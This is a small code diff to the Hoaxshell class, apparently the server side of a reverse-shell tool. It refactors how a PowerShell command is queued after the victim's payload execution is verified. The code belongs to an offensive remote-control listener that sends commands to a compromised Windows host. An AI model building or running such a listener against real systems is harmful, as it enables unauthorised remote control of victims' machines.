@@ -237,7 +237,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		# Verify execution
 		if self.path == f'/{Hoaxshell.verify}' and legit:
-
+			command_pool = "split-path $pwd'\\0x00'"
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
 			self.send_header('Access-Control-Allow-Origin', '*')
@@ -250,7 +250,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '')
 			Hoaxshell.prompt_ready = False
-			Hoaxshell.command_pool.append("split-path $pwd'\\0x00'")
+			Hoaxshell.command_pool.append(command_pool)
 			Hoaxshell.rst_promt_required = True
 
 
